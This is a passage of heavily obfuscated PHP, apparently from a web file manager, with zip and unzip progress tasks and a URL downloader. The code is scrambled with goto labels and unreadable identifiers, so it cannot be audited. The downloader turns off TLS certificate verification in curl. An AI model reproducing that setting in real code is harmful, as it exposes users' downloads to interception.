$Cò‘í©÷Æ->updateFileEnd($E„ëÆ¥ñ¹’[$Fö¨‚‚†¯é[28]], $E„ëÆ¥ñ¹’[$Fö¨‚‚†¯é[77]]); continue; } goto Féˆ¸³Î÷; FïÒ‚ôë»·: $aÄƒ¤ƒæØÕ = array($Fö¨‚‚†¯é[746] => $FÎ‡ª˜âË, $Fö¨‚‚†¯é[75] => $EçØ®øÔ ); Model($Fö¨‚‚†¯é[164])->where($F«ê˜Ğˆ¾Ò)->save($aÄƒ¤ƒæØÕ); goto D‡Œõ–®‘; Féˆ¸³Î÷: if (IO::exist($EçØ®øÔ )) { $Cò‘í©÷Æ->updateFileEnd($E„ëÆ¥ñ¹’[$Fö¨‚‚†¯é[28]], $E„ëÆ¥ñ¹’[$Fö¨‚‚†¯é[77]]); continue; } if (!IO::move($B¦µñùò¥ø, get_path_father($EçØ®øÔ ))) { $D—»­Š»„è = !1; break; } $F«ê˜Ğˆ¾Ò = array($Fö¨‚‚†¯é[415] => $E„ëÆ¥ñ¹’[$Fö¨‚‚†¯é[415]]); goto FïÒ‚ôë»·; D‡Œõ–®‘: } $this->removeByFileID($c‚‚ßñŒ¿); goto EŒÇßÌ¿†È; Fæ¹é„åÂ: } public function progress($e§Ñä×”ë‘) { return Task::get($_SERVER[Äº¡•ô™Ÿ][2340] . $e§Ñä×”ë‘); } private function removeByFileID($AŞÒä§ä°š = array()) { goto e½È¹ÄÌ·å; e½È¹ÄÌ·å: $Fˆ‘¶ìÖÅÙ =& $_SERVER[Äº¡•ô™Ÿ]; if (empty($AŞÒä§ä°š)) { return; } $BÕ»£‘ø¯Ö = array($Fˆ‘¶ìÖÅÙ[415] => array($Fˆ‘¶ìÖÅÙ[7], $AŞÒä§ä°š)); goto c¶Ôçå†Ï­; c¶Ôçå†Ï­: $EçÏÎ†è¸ = Model($Fˆ‘¶ìÖÅÙ[1110])->where($BÕ»£‘ø¯Ö)->field($Fˆ‘¶ìÖÅÙ[366])->select(); if (!$EçÏÎ†è¸) { return; } $EçÏÎ†è¸ = array_to_keyvalue($EçÏÎ†è¸, $Fˆ‘¶ìÖÅÙ[33], $Fˆ‘¶ìÖÅÙ[366]); goto d©ˆ‚‘ğº; d©ˆ‚‘ğº: foreach ($EçÏÎ†è¸ as $B„Ç÷ÄˆÔ•) { Model($Fˆ‘¶ìÖÅÙ[379])->removeNow($B„Ç÷ÄˆÔ•, !1); } goto e±¦›î“¢; e±¦›î“¢: } private function removeShareItems($e‘ŸÓ®³‚‘) { goto aêãÃÆçˆ; Fäò­¯ˆ¨Ô: Model($FãŸ¢­ó³¤[532])->remove($F—à¨åÉÍ); goto CîŠïßÌˆÂ; aÆØ“âœ“¸: $c²¥Å”ô–ß = Model($FãŸ¢­ó³¤[2056])->where($bˆÎ˜ÌëÈ¯)->field($FãŸ¢­ó³¤[437])->select(); if (empty($c²¥Å”ô–ß)) { return; } $F—à¨åÉÍ = array_to_keyvalue($c²¥Å”ô–ß, $FãŸ¢­ó³¤[33], $FãŸ¢­ó³¤[437]); goto Fäò­¯ˆ¨Ô; aêãÃÆçˆ: $FãŸ¢­ó³¤ =& $_SERVER[Äº¡•ô™Ÿ]; $aÖ¸º÷Ìš© = "\x7b\x69\157\72{$e‘ŸÓ®³‚‘}\x7d\x2f"; $bˆÎ˜ÌëÈ¯ = array($FãŸ¢­ó³¤[366] => 0, $FãŸ¢­ó³¤[1018] => array($FãŸ¢­ó³¤[754], "{$aÖ¸º÷Ìš©}\45")); goto aÆØ“âœ“¸; CîŠïßÌˆÂ: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\155\56\114\x69\147\150\x74\x41\x70\x70"; public $modelType = "\x53\171\163\164\x65\x6d\117\160\164\x69\157\156"; public $field = array("\156\x61\x6d\x65", "\147\x72\157\165\160", "\x64\145\x73\143", "\x63\157\156\164\145\x6e\164"); public function listData($a¡‡Ê‘„å = false, $DÉºš”•«  = "\x6d\x6f\x64\x69\146\x79\124\151\155\145", $d‡é§¶î¦ì = true) { return parent::listData($a¡‡Ê‘„å, $DÉºš”•« , $d‡é§¶î¦ì); } public function remove($FØÍ®ØÈ£) { $C¤”ï§ÙÀÊ = $this->findByName($FØÍ®ØÈ£); if (!$C¤”ï§ÙÀÊ) { return !1; } return parent::remove($C¤”ï§ÙÀÊ[$_SERVER[Äº¡•ô™Ÿ][364]]); } public function add($Eò†ï°šˆÑ) { if ($this->findByName($Eò†ï°šˆÑ[$_SERVER[Äº¡•ô™Ÿ][28]])) { return !1; } return parent::insert($Eò†ï°šˆÑ); } public function update($aÜÎÁ§ó, $e†ÛÈê•Ïø) { $eù”£Ï‹•Î =& $_SERVER[Äº¡•ô™Ÿ]; $A¤ö××øîé = $this->findByName($aÜÎÁ§ó); $e±Æ°Ìéİ„ = $this->findByName($e†ÛÈê•Ïø[$eù”£Ï‹•Î[28]]); if (!$A¤ö××øîé || $e±Æ°Ìéİ„ && $e±Æ°Ìéİ„[$eù”£Ï‹•Î[364]] != $A¤ö××øîé[$eù”£Ï‹•Î[364]]) { return !1; } return parent::update($A¤ö××øîé[$eù”£Ï‹•Î[364]], $e†ÛÈê•Ïø); } } goto B„—‡çÆŸÓ; DÛÆÜ’ “ª: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto f´—âëËœÊ; b£…ëãó¾¾: if (!$A±ÜÃê¯ô[$e‹õ¬¦á½‡[1321]]) { $A±ÜÃê¯ô[$e‹õ¬¦á½‡[1321]] = LNG($e‹õ¬¦á½‡[1485]); } goto c¯‰Ğ¿ñ¸; d¶ÈâÄÎ¼¾: Hook::bind($e‹õ¬¦á½‡[1035], array($this, $e‹õ¬¦á½‡[1483])); $A±ÜÃê¯ô =& $this->task; $A±ÜÃê¯ô[$e‹õ¬¦á½‡[1484]] = $e‹õ¬¦á½‡[1040]; goto b£…ëãó¾¾; f´—âëËœÊ: $e‹õ¬¦á½‡ =& $_SERVER[Äº¡•ô™Ÿ]; parent::startAfter(); Hook::bind($e‹õ¬¦á½‡[1481], array($this, $e‹õ¬¦á½‡[1482])); goto d¶ÈâÄÎ¼¾; c¯‰Ğ¿ñ¸: } protected function endAfter() { $E‰½×©Š÷ƒ =& $_SERVER[Äº¡•ô™Ÿ]; parent::endAfter(); Hook::unbind($E‰½×©Š÷ƒ[1481], array($this, $E‰½×©Š÷ƒ[1482])); Hook::unbind($E‰½×©Š÷ƒ[1035], array($this, $E‰½×©Š÷ƒ[1483])); } public function updateAfter() { $bÕî’æ¹ä =& $_SERVER[Äº¡•ô™Ÿ]; $A±–öªéÕ– =& $this->task; if (!$A±–öªéÕ–[$bÕî’æ¹ä[978]] || !$A±–öªéÕ–[$bÕî’æ¹ä[701]]) { return; } if ($A±–öªéÕ–[$bÕî’æ¹ä[1484]] == $bÕî’æ¹ä[1040]) { $F¼®»Ã´ = 0; if ($A±–öªéÕ–[$bÕî’æ¹ä[1461]]) { $F¼®»Ã´ = $A±–öªéÕ–[$bÕî’æ¹ä[1462]] / $A±–öªéÕ–[$bÕî’æ¹ä[1461]]; } $A±–öªéÕ–[$bÕî’æ¹ä[1417]] = $F¼®»Ã´ * 0.3; } else { if ($A±–öªéÕ–[$bÕî’æ¹ä[1484]] == $bÕî’æ¹ä[298]) { $F¼®»Ã´ = $A±–öªéÕ–[$bÕî’æ¹ä[990]] / $A±–öªéÕ–[$bÕî’æ¹ä[978]]; $A±–öªéÕ–[$bÕî’æ¹ä[1417]] = 0.3 + $F¼®»Ã´ * 0.4; } else { if ($A±–öªéÕ–[$bÕî’æ¹ä[1484]] == $bÕî’æ¹ä[91]) { $Béµ²†øˆÒ = 0; if ($A±–öªéÕ–[$bÕî’æ¹ä[1463]] == $bÕî’æ¹ä[91]) { $Béµ²†øˆÒ = $A±–öªéÕ–[$bÕî’æ¹ä[1462]]; } $F¼®»Ã´ = ($A±–öªéÕ–[$bÕî’æ¹ä[1466]] + $Béµ²†øˆÒ) / $A±–öªéÕ–[$bÕî’æ¹ä[701]]; $A±–öªéÕ–[$bÕî’æ¹ä[1417]] = 0.3 + 0.4 + $F¼®»Ã´ * 0.3; } } } if ($A±–öªéÕ–[$bÕî’æ¹ä[1417]] > 0) { $dôÈ›ËÍ–¨ = timeFloat() - $A±–öªéÕ–[$bÕî’æ¹ä[1419]] - $A±–öªéÕ–[$bÕî’æ¹ä[1422]]; $A±–öªéÕ–[$bÕî’æ¹ä[1423]] = $dôÈ›ËÍ–¨ * (1 - $A±–öªéÕ–[$bÕî’æ¹ä[1417]]) / $A±–öªéÕ–[$bÕî’æ¹ä[1417]]; } } public function addFile($CºÉ°Š™ä) { goto eç…æÏ•£¤; eç…æÏ•£¤: $F¡‡¿É‚”Ô =& $_SERVER[Äº¡•ô™Ÿ]; $B‹Èá¹Š©İ =& $this->task; $d¦ïáÒŒÙ = IO::info($CºÉ°Š™ä); goto d–é–Í¾ÁÓ; d·»éã±›˜: $B‹Èá¹Š©İ[$F¡‡¿É‚”Ô[980]] = $F¡‡¿É‚”Ô[1474]; $B‹Èá¹Š©İ[$F¡‡¿É‚”Ô[1463]] = $F¡‡¿É‚”Ô[1040]; $B‹Èá¹Š©İ[$F¡‡¿É‚”Ô[701]] = $d¦ïáÒŒÙ[$F¡‡¿É‚”Ô[77]]; goto A©æì­¸‰; A©æì­¸‰: $B‹Èá¹Š©İ[$F¡‡¿É‚”Ô[978]] = 1; $DÀ™éÑ = 0; $B‹Èá¹Š©İ[$F¡‡¿É‚”Ô[1467]] = array($F¡‡¿É‚”Ô[1468] => $DÀ™éÑ + 1, $F¡‡¿É‚”Ô[383] => $d¦ïáÒŒÙ[$F¡‡¿É‚”Ô[28]], $F¡‡¿É‚”Ô[75] => $d¦ïáÒŒÙ[$F¡‡¿É‚”Ô[75]], $F¡‡¿É‚”Ô[462] => $d¦ïáÒŒÙ[$F¡‡¿É‚”Ô[462]] ? $d¦ïáÒŒÙ[$F¡‡¿É‚”Ô[462]] : $d¦ïáÒŒÙ[$F¡‡¿É‚”Ô[75]]); goto Aà¥¿Ë®­; Aà¥¿Ë®­: $this->update(); goto f‚ÜÙ«•ƒ; d–é–Í¾ÁÓ: $B‹Èá¹Š©İ[$F¡‡¿É‚”Ô[1459]] = $d¦ïáÒŒÙ[$F¡‡¿É‚”Ô[28]]; $B‹Èá¹Š©İ[$F¡‡¿É‚”Ô[1461]] = $d¦ïáÒŒÙ[$F¡‡¿É‚”Ô[77]]; $B‹Èá¹Š©İ[$F¡‡¿É‚”Ô[1462]] = 0; goto d·»éã±›˜; f‚ÜÙ«•ƒ: } public function unzipAfter($bâ½ö“¤¾Ø) { goto CŠí“»µñ¤; d‰Ô‚Ù‹˜·: $Fô³ĞÌŠâ[$Dá÷¾Åæñ±[990]] = 0; $Fô³ĞÌŠâ[$Dá÷¾Åæñ±[1461]] = 0; $Fô³ĞÌŠâ[$Dá÷¾Åæñ±[1462]] = 0; goto aÎÂš‘ğÚ«; CŠí“»µñ¤: $Dá÷¾Åæñ± =& $_SERVER[Äº¡•ô™Ÿ]; $Fô³ĞÌŠâ =& $this->task; $Fô³ĞÌŠâ[$Dá÷¾Åæñ±[1484]] = $Dá÷¾Åæñ±[91]; goto Bæ·êÙ Ï¨; Bæ·êÙ Ï¨: $B¡ Ã êƒ = IO::infoWithChildren($bâ½ö“¤¾Ø); $a±Û¾Ô• = 0; $Fô³ĞÌŠâ[$Dá÷¾Åæñ±[1467]] = array($Dá÷¾Åæñ±[1468] => $a±Û¾Ô• + 1, $Dá÷¾Åæñ±[383] => $B¡ Ã êƒ[$Dá÷¾Åæñ±[28]], $Dá÷¾Åæñ±[75] => $B¡ Ã êƒ[$Dá÷¾Åæñ±[75]], $Dá÷¾Åæñ±[462] => $B¡ Ã êƒ[$Dá÷¾Åæñ±[462]] ? $B¡ Ã êƒ[$Dá÷¾Åæñ±[462]] : $B¡ Ã êƒ[$Dá÷¾Åæñ±[75]]); goto b‚ˆÂÏÇ„é; aÎÂš‘ğÚ«: $Fô³ĞÌŠâ[$Dá÷¾Åæñ±[1459]] = $Dá÷¾Åæñ±[33]; $Fô³ĞÌŠâ[$Dá÷¾Åæñ±[1466]] = 0; $Fô³ĞÌŠâ[$Dá÷¾Åæñ±[701]] = $B¡ Ã êƒ[$Dá÷¾Åæñ±[77]]; goto B¤ÒùÎÃƒ‘; B¤ÒùÎÃƒ‘: $this->update(); self::log($Dá÷¾Åæñ±[1486] . json_encode(array($Fô³ĞÌŠâ, $B¡ Ã êƒ))); goto bÒÊ”à˜¾; b‚ˆÂÏÇ„é: if ($B¡ Ã êƒ[$Dá÷¾Åæñ±[29]] == $Dá÷¾Åæñ±[164]) { $Fô³ĞÌŠâ[$Dá÷¾Åæñ±[978]] = 1; } else { $Fô³ĞÌŠâ[$Dá÷¾Åæñ±[978]] = $B¡ Ã êƒ[$Dá÷¾Åæñ±[80]][$Dá÷¾Åæñ±[78]]; } $Fô³ĞÌŠâ[$Dá÷¾Åæñ±[980]] = $Dá÷¾Åæñ±[33]; $Fô³ĞÌŠâ[$Dá÷¾Åæñ±[1463]] = 0; goto d‰Ô‚Ù‹˜·; bÒÊ”à˜¾: } public function nameParse($A´ÈÓÑ’ğ) { goto cİË‚†‹‡¯; bº´‰îïñ–: $this->update(); goto bÖšáäÖ°‹; cİË‚†‹‡¯: $AÌ¸·­Íƒù =& $_SERVER[Äº¡•ô™Ÿ]; $a¢¿å’£õ =& $this->task; if ($a¢¿å’£õ[$AÌ¸·­Íƒù[1484]] == $AÌ¸·­Íƒù[1040]) { $a¢¿å’£õ[$AÌ¸·­Íƒù[1484]] = $AÌ¸·­Íƒù[298]; $a¢¿å’£õ[$AÌ¸·­Íƒù[1466]] = 0; $a¢¿å’£õ[$AÌ¸·­Íƒù[701]] = 0; } goto fÊ½Íàâ¥Á; fÊ½Íàâ¥Á: $C¤‘Õõ‰Æ² = get_path_this($A´ÈÓÑ’ğ); if (strstr($C¤‘Õõ‰Æ², $AÌ¸·­Íƒù[93])) { $a¢¿å’£õ[$AÌ¸·­Íƒù[990]] += 1; $a¢¿å’£õ[$AÌ¸·­Íƒù[978]] += 1; } $a¢¿å’£õ[$AÌ¸·­Íƒù[1459]] = $A´ÈÓÑ’ğ; goto bº´‰îïñ–; bÖšáäÖ°‹: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $AÅÛê««ğ =& $_SERVER[Äº¡•ô™Ÿ]; parent::startAfter(); Hook::bind($AÅÛê««ğ[1487], array($this, $AÅÛê««ğ[1482])); $cåŞÒÏÃÉ– =& $this->task; $cåŞÒÏÃÉ–[$AÅÛê««ğ[1484]] = $AÅÛê««ğ[1040]; if (!$cåŞÒÏÃÉ–[$AÅÛê««ğ[1321]]) { $cåŞÒÏÃÉ–[$AÅÛê««ğ[1321]] = LNG($AÅÛê««ğ[1488]); } } protected function endAfter() { $bìÜõæµº =& $_SERVER[Äº¡•ô™Ÿ]; parent::endAfter(); Hook::unbind($bìÜõæµº[1487], array($this, $bìÜõæµº[1482])); } public function updateAfter() { $EÊ±ªğîÙ¡ =& $_SERVER[Äº¡•ô™Ÿ]; $dØİ—•‘µ =& $this->task; if (!$dØİ—•‘µ[$EÊ±ªğîÙ¡[978]] || !$dØİ—•‘µ[$EÊ±ªğîÙ¡[701]]) { return; } if ($dØİ—•‘µ[$EÊ±ªğîÙ¡[1484]] == $EÊ±ªğîÙ¡[1040]) { $aŠìƒ´œæ· = $dØİ—•‘µ[$EÊ±ªğîÙ¡[1462]]; if ($dØİ—•‘µ[$EÊ±ªğîÙ¡[1463]] != $EÊ±ªğîÙ¡[1040]) { $aŠìƒ´œæ· = 0; } $C™Î¥¹Ë¹¦ = ($dØİ—•‘µ[$EÊ±ªğîÙ¡[1466]] + $aŠìƒ´œæ·) / $dØİ—•‘µ[$EÊ±ªğîÙ¡[701]]; $dØİ—•‘µ[$EÊ±ªğîÙ¡[1417]] = $C™Î¥¹Ë¹¦ * 0.3; } else { if ($dØİ—•‘µ[$EÊ±ªğîÙ¡[1484]] == $EÊ±ªğîÙ¡[298]) { $C™Î¥¹Ë¹¦ = $dØİ—•‘µ[$EÊ±ªğîÙ¡[990]] / $dØİ—•‘µ[$EÊ±ªğîÙ¡[978]]; $dØİ—•‘µ[$EÊ±ªğîÙ¡[1417]] = 0.3 + $C™Î¥¹Ë¹¦ * 0.5; } else { if ($dØİ—•‘µ[$EÊ±ªğîÙ¡[1484]] == $EÊ±ªğîÙ¡[91]) { $C™Î¥¹Ë¹¦ = 0; if ($dØİ—•‘µ[$EÊ±ªğîÙ¡[1461]]) { $C™Î¥¹Ë¹¦ = $dØİ—•‘µ[$EÊ±ªğîÙ¡[1462]] / $dØİ—•‘µ[$EÊ±ªğîÙ¡[1461]]; } $dØİ—•‘µ[$EÊ±ªğîÙ¡[1417]] = 0.3 + 0.5 + $C™Î¥¹Ë¹¦ * 0.2; } } } if ($dØİ—•‘µ[$EÊ±ªğîÙ¡[1417]] > 0) { $d ¤ÕÜÅÜ = timeFloat() - $dØİ—•‘µ[$EÊ±ªğîÙ¡[1419]] - $dØİ—•‘µ[$EÊ±ªğîÙ¡[1422]]; $dØİ—•‘µ[$EÊ±ªğîÙ¡[1423]] = $d ¤ÕÜÅÜ * (1 - $dØİ—•‘µ[$EÊ±ªğîÙ¡[1417]]) / $dØİ—•‘µ[$EÊ±ªğîÙ¡[1417]]; } } public function copyFileStart($E¨˜­Ëª‚ , $DëàÈ”Ú¹´, $fªÔÇÓ‘›’, $f×ğÕÄ¹‹¨, $F¤Ó¿×æ±Ÿ, $BÛŸõ³ªÒ¥) { $bó²õ´¨°× =& $_SERVER[Äº¡•ô™Ÿ]; parent::copyFileStart($E¨˜­Ëª‚ , $DëàÈ”Ú¹´, $fªÔÇÓ‘›’, $f×ğÕÄ¹‹¨, $F¤Ó¿×æ±Ÿ, $BÛŸõ³ªÒ¥); $f­³‘ŒÏÏ =& $this->task; if ($f­³‘ŒÏÏ[$bó²õ´¨°×[1484]] == $bó²õ´¨°×[298]) { $f­³‘ŒÏÏ[$bó²õ´¨°×[1484]] = $bó²õ´¨°×[91]; } $this->update(); } public function copyFileEnd($B‚¡¨ŞÊ, $CóÜÆ©Ù ¤, $B©âê°«Õ , $b„İÇ’­ö‰, $fÉ½°ôòƒá, $e³ìë˜·ø) { $fÈéå¶Úì =& $_SERVER[Äº¡•ô™Ÿ]; $B»œ®Ú¦à¹ =& $this->task; $B»œ®Ú¦à¹[$fÈéå¶Úì[1462]] = $B»œ®Ú¦à¹[$fÈéå¶Úì[1461]]; $B»œ®Ú¦à¹[$fÈéå¶Úì[1466]] += $B»œ®Ú¦à¹[$fÈéå¶Úì[1461]]; $B»œ®Ú¦à¹[$fÈéå¶Úì[1463]] = $fÈéå¶Úì[33]; $this->update(); } public function nameParse($fµãòÏÂ¸„) { $Fùœ‹Åø± =& $_SERVER[Äº¡•ô™Ÿ]; $C‚¼«øËÛ° =& $this->task; if ($C‚¼«øËÛ°[$Fùœ‹Åø±[990]] < $C‚¼«øËÛ°[$Fùœ‹Åø±[978]]) { $bŠŒàÕ®¹ = get_path_this($fµãòÏÂ¸„); if (strstr($bŠŒàÕ®¹, $Fùœ‹Åø±[93])) { $C‚¼«øËÛ°[$Fùœ‹Åø±[990]] += 1; } } if ($C‚¼«øËÛ°[$Fùœ‹Åø±[1484]] == $Fùœ‹Åø±[1040]) { $C‚¼«øËÛ°[$Fùœ‹Åø±[1484]] = $Fùœ‹Åø±[298]; } $C‚¼«øËÛ°[$Fùœ‹Åø±[1459]] = $fµãòÏÂ¸„; $this->update(); } } class Downloader { static function start($dÆÅŸ„Â‰, $C›Æ’Åˆ™, $E•³ÜŒ”–ó = 10) { goto A “ÕÍˆó; få÷ƒåˆİÆ: $a½‰å¢Ùõñ = intval($cøäÖßÊã÷[$dÌ†ˆ™Œ††[322]]); if (file_exists($A†…°‰È¾ ) && time() - filemtime($A†…°‰È¾ ) < 3) { return array($dÌ†ˆ™Œ††[1032] => !1, $dÌ†ˆ™Œ††[1034] => $dÌ†ˆ™Œ††[1491]); } $bÌĞÜá¬— = array(); goto a†ö¥‹ˆ±; AÒÙ¨™§÷: if ($c‡…à–ØË > $a½‰å¢Ùõñ) { @unlink($A†…°‰È¾ ); } file_put_contents($b†Åå”¸×, json_encode($bÌĞÜá¬—)); $dÌ‡§òÄ¹„ = self::fileDownloadCurl($dÆÅŸ„Â‰, $C›Æ’Åˆ™, !0, $c‡…à–ØË, $a½‰å¢Ùõñ); goto FÇ˜Î¨‘ˆö; a†ö¥‹ˆ±: if (is_file($b†Åå”¸×)) { $bØ¹Â„‡ø· = file_get_contents($b†Åå”¸×); $bÌĞÜá¬— = json_decode($bØ¹Â„‡ø·, 1); } if (file_exists($C›Æ’Åˆ™) && $a½‰å¢Ùõñ == filesize($C›Æ’Åˆ™)) { @unlink($A†…°‰È¾ ); @unlink($b†Åå”¸×); return array($dÌ†ˆ™Œ††[1032] => !0, $dÌ†ˆ™Œ††[1034] => $dÌ†ˆ™Œ††[1492]); } if ($bÌĞÜá¬—[$dÌ†ˆ™Œ††[322]] != $a½‰å¢Ùõñ) { $bÌĞÜá¬— = array($dÌ†ˆ™Œ††[322] => $a½‰å¢Ùõñ); } goto AÒÙ¨™§÷; b½¡À¼Æ•: $A†…°‰È¾  = $C›Æ’Åˆ™ . $dÌ†ˆ™Œ††[1490]; if (is_array($dÆÅŸ„Â‰)) { $cøäÖßÊã÷ = $dÆÅŸ„Â‰; } else { $cøäÖßÊã÷ = url_header($dÆÅŸ„Â‰); } $dÆÅŸ„Â‰ = $cøäÖßÊã÷[$dÌ†ˆ™Œ††[292]]; goto C¥´¤×öË; C¥´¤×öË: if (!$dÆÅŸ„Â‰) { return array($dÌ†ˆ™Œ††[1032] => !1, $dÌ†ˆ™Œ††[1034] => $dÌ†ˆ™Œ††[1037]); } if (!$cøäÖßÊã÷[$dÌ†ˆ™Œ††[1283]] || $cøäÖßÊã÷[$dÌ†ˆ™Œ††[322]] == 0) { @unlink($A†…°‰È¾ ); @unlink($C›Æ’Åˆ™); $dÌ‡§òÄ¹„ = self::fileDownloadFopen($dÆÅŸ„Â‰, $C›Æ’Åˆ™, $cøäÖßÊã÷[$dÌ†ˆ™Œ††[322]]); if ($dÌ‡§òÄ¹„[$dÌ†ˆ™Œ††[1032]]) { return $dÌ‡§òÄ¹„; } else { @unlink($A†…°‰È¾ ); @unlink($C›Æ’Åˆ™); $dÌ‡§òÄ¹„ = self::fileDownloadCurl($dÆÅŸ„Â‰, $C›Æ’Åˆ™, !1, 0, $cøäÖßÊã÷[$dÌ†ˆ™Œ††[322]]); @unlink($A†…°‰È¾ ); return $dÌ‡§òÄ¹„; } } $c‡…à–ØË = is_file($A†…°‰È¾ ) ? filesize($A†…°‰È¾ ) : 0; goto få÷ƒåˆİÆ; A “ÕÍˆó: $dÌ†ˆ™Œ†† =& $_SERVER[Äº¡•ô™Ÿ]; if (!request_url_safe($dÆÅŸ„Â‰)) { return array($dÌ†ˆ™Œ††[1032] => !1, $dÌ†ˆ™Œ††[1034] => $dÌ†ˆ™Œ††[1037]); } $b†Åå”¸× = $C›Æ’Åˆ™ . $dÌ†ˆ™Œ††[1489]; goto b½¡À¼Æ•; FÇ˜Î¨‘ˆö: if ($dÌ‡§òÄ¹„[$dÌ†ˆ™Œ††[1032]]) { @unlink($b†Åå”¸×); } return $dÌ‡§òÄ¹„; goto AÉß¬ÌÎ–Ï; AÉß¬ÌÎ–Ï: } static function fileDownloadFopen($dœƒùÏ¨ºÜ, $aÑ¼‡Ó×», $d©¢¢ĞÛùø = 0) { $d­ª™ê”³ =& $_SERVER[Äº¡•ô™Ÿ]; @ini_set($d­ª™ê”³[1493], $d­ª™ê”³[1494]); $BïéÁö«¹ = $aÑ¼‡Ó×» . $d­ª™ê”³[1490]; set_timeout(); @unlink($BïéÁö«¹); if ($cÂ®é°¹ˆ = @fopen($dœƒùÏ¨ºÜ, $d­ª™ê”³[1495])) { goto AÏéîÅİÛƒ; AÏéîÅİÛƒ: if (!($a„ì÷õÍ = @fopen($BïéÁö«¹, $d­ª™ê”³[1496]))) { return array($d­ª™ê”³[1032] => !1, $d­ª™ê”³[1034] => $d­ª™ê”³[1497]); } while (!feof($cÂ®é°¹ˆ)) { if (!file_exists($BïéÁö«¹)) { fclose($a„ì÷õÍ); return array($d­ª™ê”³[1032] => !1, $d­ª™ê”³[1034] => $d­ª™ê”³[1498]); } clearstatcache(); if ($d©¢¢ĞÛùø > 0 && $d©¢¢ĞÛùø == filesize(iconv_system($BïéÁö«¹))) { break; } fwrite($a„ì÷õÍ, fread($cÂ®é°¹ˆ, 1024 * 8), 1024 * 8); } fclose($a„ì÷õÍ); goto Fƒ‚±Ã‰ª¸; Fƒ‚±Ã‰ª¸: fclose($cÂ®é°¹ˆ); $A¯ŞÆÙÂÎÒ = filesize(iconv_system($BïéÁö«¹)); if ($d©¢¢ĞÛùø != 0 && $A¯ŞÆÙÂÎÒ != $d©¢¢ĞÛùø) { return array($d­ª™ê”³[1032] => !1, $d­ª™ê”³[1034] => $d­ª™ê”³[1499]); } goto D¶­ğç½†Æ; D¶­ğç½†Æ: self::checkGzip($BïéÁö«¹); if (!@rename($BïéÁö«¹, $aÑ¼‡Ó×»)) { usleep(round(rand(0, 1000) * 50)); @unlink($aÑ¼‡Ó×»); $d™„ã„¹á÷ = @rename($BïéÁö«¹, $aÑ¼‡Ó×»); if (!$d™„ã„¹á÷) { return array($d­ª™ê”³[1032] => !1, $d­ª™ê”³[1034] => $d­ª™ê”³[1500]); } } return array($d­ª™ê”³[1032] => !0, $d­ª™ê”³[1034] => $d­ª™ê”³[699]); goto fÉñ”Ç’Ã; fÉñ”Ç’Ã: } else { return array($d­ª™ê”³[1032] => !1, $d­ª™ê”³[1034] => $d­ª™ê”³[1501]); } } static function fileDownloadCurl($bîêŠß–ƒó, $Fˆ§Îœ¿¯š, $aàšğƒÇ‹ = false, $DÈôÕÓ»ÀÕ = 0, $C¥ù³öÓÈ = 0) { goto F˜¶ÌÓÔ¾Ù; B”áŒ…‹æÏ: return array($FŸÊŠåÙ‘[1032] => !1, $FŸÊŠåÙ‘[1034] => $FŸÊŠåÙ‘[1505]); goto bÍàâÖÌ; fÒĞæø†¨£: curl_setopt($AİªŸ×øö˜, CURLOPT_NOPROGRESS, !1); curl_setopt($AİªŸ×øö˜, CURLOPT_PROGRESSFUNCTION, $FŸÊŠåÙ‘[1503]); curl_progress_start($AİªŸ×øö˜); goto DŒø›ğÑËñ; f¡Âœ—³©˜: if ($a•ÊóĞ÷» < $C¥ù³öÓÈ && $C¥ù³öÓÈ != 0) { return array($FŸÊŠåÙ‘[1032] => !1, $FŸÊŠåÙ‘[1034] => $FŸÊŠåÙ‘[1491]); } if ($a•ÊóĞ÷» > $C¥ù³öÓÈ && $C¥ù³öÓÈ != 0) { return array($FŸÊŠåÙ‘[1032] => !1, $FŸÊŠåÙ‘[1034] => $FŸÊŠåÙ‘[1499]); } if ($b ˆÍ¿°Úì && filesize($e”¦ã±“Ş) != 0) { self::checkGzip($e”¦ã±“Ş); if (!@rename($e”¦ã±“Ş, $Fˆ§Îœ¿¯š)) { @unlink($Fˆ§Îœ¿¯š); $b ˆÍ¿°Úì = @rename($e”¦ã±“Ş, $Fˆ§Îœ¿¯š); if (!$b ˆÍ¿°Úì) { return array($FŸÊŠåÙ‘[1032] => !1, $FŸÊŠåÙ‘[1034] => $FŸÊŠåÙ‘[1504]); } } return array($FŸÊŠåÙ‘[1032] => !0, $FŸÊŠåÙ‘[1034] => $FŸÊŠåÙ‘[699]); } goto B”áŒ…‹æÏ; Bª¬Úß–å¸: $cÊõ¹£çô“ = @fopen($e”¦ã±“Ş, $FŸÊŠåÙ‘[982]); if (!$cÊõ¹£çô“) { return array($FŸÊŠåÙ‘[1032] => !1, $FŸÊŠåÙ‘[1034] => $FŸÊŠåÙ‘[1502]); } $AİªŸ×øö˜ = curl_init($bîêŠß–ƒó); goto eÍÉ˜¯Úõµ; DŒø›ğÑËñ: curl_setopt($AİªŸ×øö˜, CURLOPT_USERAGENT, $FŸÊŠåÙ‘[1494]); $b ˆÍ¿°Úì = curl_exec($AİªŸ×øö˜); curl_progress_end($AİªŸ×øö˜); goto A¤ÛÉÖÙŒ›; eÍÉ˜¯Úõµ: if ($aàšğƒÇ‹) { curl_setopt($AİªŸ×øö˜, CURLOPT_RANGE, $DÈôÕÓ»ÀÕ . $FŸÊŠåÙ‘[717]); } curl_setopt($AİªŸ×øö˜, CURLOPT_FILE, $cÊõ¹£çô“); curl_setopt($AİªŸ×øö˜, CURLOPT_REFERER, get_url_link($bîêŠß–ƒó)); goto f”˜›ñÒµ…; A¤ÛÉÖÙŒ›: curl_close($AİªŸ×øö˜); fclose($cÊõ¹£çô“); $a•ÊóĞ÷» = filesize(iconv_system($e”¦ã±“Ş)); goto f¡Âœ—³©˜; F˜¶ÌÓÔ¾Ù: $FŸÊŠåÙ‘ =& $_SERVER[Äº¡•ô™Ÿ]; $e”¦ã±“Ş = $Fˆ§Îœ¿¯š . $FŸÊŠåÙ‘[1490]; set_timeout(); goto Bª¬Úß–å¸; f”˜›ñÒµ…: curl_setopt($AİªŸ×øö˜, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($AİªŸ×øö˜, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($AİªŸ×øö˜, CURLOPT_SSL_VERIFYHOST, 0); goto fÒĞæø†¨£; bÍàâÖÌ: } static function checkGzip($EÀØŸé‚¢ó) { goto f˜ÍæÊ›‘‚; D‚ÚÛ‹¶½Î: file_put_contents($EÀØŸé‚¢ó, $eÖÎÆÄĞç¹); goto 